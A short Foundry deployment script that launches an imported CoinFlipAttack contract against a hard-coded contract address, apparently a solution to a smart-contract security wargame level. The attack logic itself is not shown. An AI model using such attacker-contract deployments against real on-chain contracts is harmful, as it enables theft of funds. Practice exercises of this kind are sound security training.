// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.4;

import { Script } from "forge-std/Script.sol";
import { CoinFlipAttack } from "../src/CoinFlip/CoinFlipAttack.sol";

/// @dev See the Solidity Scripting tutorial: https://book.getfoundry.sh/tutorials/solidity-scripting
contract CoinFlipAttackScript is Script {
    CoinFlipAttack internal coinFlipAttacker;

    function run() public {
        vm.startBroadcast();
        coinFlipAttacker = new CoinFlipAttack();
        callCoinFlip(address(0x677F2b9b7b5CAdC57dc27880004cb914494BA0F7));
        vm.stopBroadcast();
    }

    function callCoinFlip(address coinFlipInstance) public {
        coinFlipAttacker.callCoinFlip(coinFlipInstance);
    }
}
